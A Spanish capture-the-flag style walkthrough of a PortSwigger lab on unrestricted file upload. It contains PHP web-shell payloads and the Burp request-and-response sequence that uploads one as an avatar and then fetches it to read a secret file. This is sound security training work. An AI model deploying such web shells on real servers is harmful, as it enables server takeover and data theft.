# 📲 Laboratorio: Ejecución remota de código mediante carga web shell

**Vulnerabilidades de carga de archivos**Cualquier funcionalidad que permita a los usuarios cargar archivos al sistema de archivos del servidor es intrínsecamente peligrosa. No aplicar las restricciones adecuadas a los archivos que los usuarios pueden cargar puede potencialmente permitir que un atacante ejecute comandos arbitrarios del sistema, dándoles control total sobre el servidor.

### ¿Cuáles son las vulnerabilidades de carga de archivos?

Las vulnerabilidades de carga de archivos ocurren cuando un servidor web permite a los usuarios cargar archivos en su sistema de archivos sin validar suficientemente elementos como su nombre, tipo, contenido o tamaño. No aplicar adecuadamente las restricciones sobre estos podría significar que incluso una función básica de carga de imágenes pueda usarse para cargar archivos arbitrarios y potencialmente peligrosos. Esto podría incluso incluir archivos de script del lado del servidor que permitan la ejecución remota de código.

En algunos casos, el hecho de cargar el archivo es por sí solo suficiente para causar daños. Otros ataques pueden implicar una solicitud HTTP de seguimiento del archivo, normalmente para activar su ejecución por parte del servidor.

### ¿Cómo surgen las vulnerabilidades en la carga de archivos?

Dados los peligros bastante obvios, es raro que los sitios web no tengan restricciones de ningún tipo sobre los archivos que los usuarios pueden cargar. Más comúnmente, los desarrolladores implementan lo que creen que es una validación sólida que es inherentemente defectuosa o puede ser fácilmente eludida.

Por ejemplo, pueden intentar incluir en la lista negra tipos de archivos peligrosos, pero no tienen en cuenta las discrepancias en el análisis al verificar las extensiones de los archivos. Al igual que con cualquier lista negra, también es fácil omitir accidentalmente tipos de archivos más oscuros que aún pueden ser peligrosos.

En otros casos, el sitio web puede intentar comprobar el tipo de archivo verificando propiedades que un atacante pueda manipular fácilmente utilizando herramientas como Burp Proxy o Repetidor.

En última instancia, incluso medidas de validación sólidas pueden aplicarse de manera inconsistente en toda la red de hosts y directorios que forman el sitio web, lo que genera discrepancias que pueden explotarse.

### Explotar la carga de archivos sin restricciones para implementar un shell web

Desde una perspectiva de seguridad, el peor escenario posible es cuando un sitio web le permite cargar scripts del lado del servidor, como archivos PHP, Java o Python, y también está configurado para ejecutarlos como código. Esto hace que sea trivial crear su propio shell web en el servidor.

**shell web**

Un shell web es un script malicioso que permite a un atacante ejecutar comandos arbitrarios en un servidor web remoto simplemente enviando solicitudes HTTP al punto final correcto.

Si puede cargar con éxito un shell web, efectivamente tendrá control total sobre el servidor. Esto significa que puede leer y escribir archivos arbitrarios, filtrar datos confidenciales e incluso usar el servidor para realizar ataques tanto contra la infraestructura interna como contra otros servidores fuera de la red. Por ejemplo, el siguiente resumen PHP podría usarse para leer archivos arbitrarios del sistema de archivos del servidor:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

Una vez cargado, enviar una solicitud para este archivo malicioso devolverá el contenido del archivo de destino en la respuesta.

Un shell web más versátil podría verse así:

`<?php echo system($_GET['command']); ?>`

Este script le permite pasar un comando del sistema arbitrario a través de un parámetro de consulta de la siguiente manera:

`GET /example/exploit.php?command=id HTTP/1.1`

### Laboratorio: ejecución remota de código mediante carga de shell web

APRENDIZ

LABORATORIONo resuelto

Esta práctica de laboratorio contiene una función de carga de imágenes vulnerables. No realiza ninguna validación de los archivos que los usuarios cargan antes de almacenarlos en el sistema de archivos del servidor.

Para resolver la práctica de laboratorio, cargue un shell web PHP básico y utilícelo para filtrar el contenido del archivo `/home/carlos/secret`. Envíe este secreto usando el botón provisto en el banner del laboratorio.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:`wiener:peter`

```python
// Some code


Laboratorio: Ejecución remota de código mediante carga web shell 





NOS LOGUEAMOS CON WIENER Y SU PASSWD PETER, Y VEMOS EN EL PANEL QUE TENEMOS LA CARGA DE ARCHIVOS; INTENTAMOS CARGAR UN ARCHIVO CUALQUIERA DE PRUEVA EN ESTE ACASO UN.PNG PARA VER EL COMPROTAMIENTO DE LAS REQUEST Y RESPONSE:




REQUEST:


GET /generate_204 HTTP/1.1
Host: www.gstatic.com
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8
Connection: close






POST /my-account/avatar HTTP/1.1
Host: 0aab0075047886d0810e5c5600eb0033.web-security-academy.net
Cookie: session=pVpKMVMQHqU2KXRVSYzl19ckNErGsrDq
Content-Length: 87839
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0aab0075047886d0810e5c5600eb0033.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZY3RdKSJEbKaTMG8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aab0075047886d0810e5c5600eb0033.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundaryZY3RdKSJEbKaTMG8
Content-Disposition: form-data; name="avatar"; filename="_5afc11da-f433-4302-bd47-8d5bd289d9ef.jpeg"
Content-Type: image/jpeg

ÿØÿà








REQUEST ENVIANDO UN .XML ESTE EN VES DE EN ASCCI LO VEMOS EN TEXTO PLANO, ASI QUE CALCULO QEU DIRECTAMENTE NI HARIA FALTA EN CREAR UN ARCHIVO; SI NO QUE LO PODEMOS ESCRIBIR AL SHELL EN LAS SOLICITUD REQUES POR POST DIRECTAMENTE CON REPITER:



RESPONSE:




POST /my-account/avatar HTTP/2
Host: 0aab0075047886d0810e5c5600eb0033.web-security-academy.net
Cookie: session=pVpKMVMQHqU2KXRVSYzl19ckNErGsrDq
Content-Length: 2740
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0aab0075047886d0810e5c5600eb0033.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFgCEckaUWLxdV2Oz
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aab0075047886d0810e5c5600eb0033.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

------WebKitFormBoundaryFgCEckaUWLxdV2Oz
Content-Disposition: form-data; name="avatar"; filename="index.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<?xml-stylesheet href="file:///usr/bin/../share/nmap/nmap.xsl" type="text/xsl"?>
<!-- Nmap 7.94 scan initiated Sun Nov 26 00:32:14 2023 as: nmap -sS -F -oA paimon3 10.10.213.133 -->
<nmaprun scanner="nmap" args="nmap -sS -F -oA paimon3 10.10.213.133" start="1700969534" startstr="Sun Nov 26 00:32:14 2023" version="7.94" xmloutputversion="1.05">
<scaninfo type="syn" protocol="tcp" numservices="100" services="7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157"/>
<verbose level="0"/>
<debugging level="0"/>
<hosthint><status state="up" reason="unknown-response" reason_ttl="0"/>
<address addr="10.10.213.133" addrtype="ipv4"/>
<hostnames>
</hostnames>
</hosthint>
<taskprogress task="SYN Stealth Scan" time="1700969535" percent="72.00" remaining="1" etc="1700969535"/>
<host starttime="1700969534" endtime="1700969536"><status state="up" reason="timestamp-reply" reason_ttl="61"/>
<address addr="10.10.213.133" addrtype="ipv4"/>
<hostnames>
</hostnames>
<ports><extraports state="closed" count="99">
<extrareasons reason="reset" count="99" proto="tcp" ports="7,9,13,21,23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157"/>
</extraports>
<port protocol="tcp" portid="22"><state state="open" reason="syn-ack" reason_ttl="61"/><service name="ssh" method="table" conf="3"/></port>
</ports>
<times srtt="247552" rttvar="214" to="248408"/>
</host>
<runstats><finished time="1700969537" timestr="Sun Nov 26 00:32:17 2023" summary="Nmap done at Sun Nov 26 00:32:17 2023; 1 IP address (1 host up) scanned in 2.44 seconds" elapsed="2.44" exit="success"/><hosts up="1" down="0" total="1"/>
</runstats>
</nmaprun>

------WebKitFormBoundaryFgCEckaUWLxdV2Oz
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryFgCEckaUWLxdV2Oz
Content-Disposition: form-data; name="csrf"

43eyQFOMNKc8GJLNo78dODVaH0IURIEC
------WebKitFormBoundaryFgCEckaUWLxdV2Oz--





 EN LA WEB ESTA EXTESION DE ARCHIVO MOSTRO ESTO:
 
 
 The file avatars/index.xml has been uploaded.
� Back to My Account





PROBAMOS ENVIAR CON REPITER UN SCRIPT DE UN SHELL POR POST:




POST /my-account/avatar HTTP/2
Host: 0aab0075047886d0810e5c5600eb0033.web-security-academy.net
Cookie: session=pVpKMVMQHqU2KXRVSYzl19ckNErGsrDq
Content-Length: 440
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0aab0075047886d0810e5c5600eb0033.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLWJjSqOd0tA05tAV
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aab0075047886d0810e5c5600eb0033.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

------WebKitFormBoundaryLWJjSqOd0tA05tAV
Content-Disposition: form-data; name="avatar"; filename="shellpaimon.php"
Content-Type: application/x-php

<?php echo system($_GET['cat /home/carlos/secret']); ?>

------WebKitFormBoundaryLWJjSqOd0tA05tAV
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryLWJjSqOd0tA05tAV
Content-Disposition: form-data; name="csrf"

43eyQFOMNKc8GJLNo78dODVaH0IURIEC
------WebKitFormBoundaryLWJjSqOd0tA05tAV--





RESPONSE:



HTTP/2 200 OK
Date: Sun, 28 Jan 2024 20:29:25 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 136

The file avatars/shellpaimon.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>









INVESTIGANDO EN LOS ARCHIVOS CUANDO SE SUBE; UNA MINI IMAGEN VIENDO EN EL HTML VEMOS QUE MARCA QUE SE CARGA CESTA IMAGEN CON LA SIGUIENTE RUTA:



<img src="/files/avatars/hacker.php" class="avatar">




PROBAMOS CON ESTA REQUESTS:




GET files/avatars/shellpaimon.php HTTP/2
Host: 0aab0075047886d0810e5c5600eb0033.web-security-academy.net
Cookie: session=pVpKMVMQHqU2KXRVSYzl19ckNErGsrDq
Content-Length: 0
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0aab0075047886d0810e5c5600eb0033.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLWJjSqOd0tA05tAV
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aab0075047886d0810e5c5600eb0033.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br



Y ME DIO ESTA RESPONSE:





HTTP/2 400 Bad Request
Date: Sun, 28 Jan 2024 20:45:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1
X-Frame-Options: SAMEORIGIN
Content-Length: 302

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 172.17.0.4 Port 80</address>
</body></html>






LECTURA DE LA REQUEST AL CAMBIAR EL MAIL:



POST /my-account/change-email HTTP/1.1
Host: 0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Cookie: session=uhnJSlUHYWt4hbcGZI22owgj9usoXTRi
Content-Length: 64
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8
Connection: close

email=P4IM0N%40hotmail.com&csrf=SsIo5Fx3ho5EaMuJDTVqU0oLQmxEm1ym






GET /my-account?id=wiener HTTP/2
Host: 0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Cookie: session=uhnJSlUHYWt4hbcGZI22owgj9usoXTRi
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8


REQUEST DE LA IMAGEN:



POST /my-account/avatar HTTP/2
Host: 0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Cookie: session=uhnJSlUHYWt4hbcGZI22owgj9usoXTRi
Content-Length: 192070
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryst7AA5drUvw3CJ07
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

------WebKitFormBoundaryst7AA5drUvw3CJ07
Content-Disposition: form-data; name="avatar"; filename="_aad1d44b-e0a7-4537-9793-a891181bba8b.jpeg"
Content-Type: image/jpeg

´~u½8_s

------WebKitFormBoundaryst7AA5drUvw3CJ07
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryst7AA5drUvw3CJ07
Content-Disposition: form-data; name="csrf"

SsIo5Fx3ho5EaMuJDTVqU0oLQmxEm1ym
------WebKitFormBoundaryst7AA5drUvw3CJ07--






AVERIGUAMOS LA RUTA DONDE SE DEPOSITAN LOS ARCHIVOS DE AVATAR SUBIDOS:



/files/avatars/shellpaimon.php


avatars/_34148858-9c47-4a36-aeb6-893736f54ce5.jpeg


https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net/my-account/avatar

BINGO CORROBAROMOS LA RUTA COMPLETA AL AVATAR SUBIDO Y ES ESTA, O TIENE ESTE FORMATO:

https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net/files/avatars/_34148858-9c47-4a36-aeb6-893736f54ce5.jpeg






VAMOS A MODIFICAR LA REQUEST PARA TRATAR DE MANDAR NUESTRO SCRIPT MALICIOSO:



POST /my-account/avatar HTTP/2
Host: 0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Cookie: session=uhnJSlUHYWt4hbcGZI22owgj9usoXTRi
Content-Length: 192070
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryst7AA5drUvw3CJ07
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

------WebKitFormBoundaryst7AA5drUvw3CJ07
Content-Disposition: form-data; name="avatar"; filename="_aad1d44b-e0a7-4537-9793-a891181bba8b.jpeg"
Content-Type: image/jpeg


------WebKitFormBoundaryst7AA5drUvw3CJ07
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryst7AA5drUvw3CJ07
Content-Disposition: form-data; name="csrf"

SsIo5Fx3ho5EaMuJDTVqU0oLQmxEm1ym
------WebKitFormBoundaryst7AA5drUvw3CJ07--












PRIMERA MODIFICACION:





POST /my-account/avatar HTTP/2
Host: 0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Cookie: session=uhnJSlUHYWt4hbcGZI22owgj9usoXTRi
Content-Length: 415
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryst7AA5drUvw3CJ07
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

------WebKitFormBoundaryst7AA5drUvw3CJ07
Content-Disposition: form-data; name="avatar"; filename="shellpaimonsitodos.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundaryst7AA5drUvw3CJ07
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryst7AA5drUvw3CJ07
Content-Disposition: form-data; name="csrf"

SsIo5Fx3ho5EaMuJDTVqU0oLQmxEm1ym
------WebKitFormBoundaryst7AA5drUvw3CJ07--






RESPONSE:






HTTP/2 200 OK
Date: Mon, 29 Jan 2024 00:25:04 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 143

The file avatars/shellpaimonsitodos.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>






LUEGO DE CARGAR POR POST NUESTRO SCRIPT, DESDE LA REQUEST QUE TENIAMOS DEL INICIO DE SESION HICIMOS UNA SOLICITUD POR METODO GET AL SERVIDOR; DE LA RUTA DONCDE SE ALOJO NUESTRO SCRIPT EL CUAL NO FUE FILTRADO DE MANERA ADECUADA Y SE TENZO OBTUVIMOS LA RESPUESTA:




REQUEST:




GET /files/avatars/shellpaimonsitodos.php HTTP/2
Host: 0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net
Cookie: session=uhnJSlUHYWt4hbcGZI22owgj9usoXTRi
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a480099031b0a4086dfdfbf00f000ef.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8





RESPONSE CON EL SECRETO DE CARLOS:


HTTP/2 200 OK
Date: Mon, 29 Jan 2024 00:27:09 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

VYmwd23PNEYkRaIidww836hai8TbptnJ
```

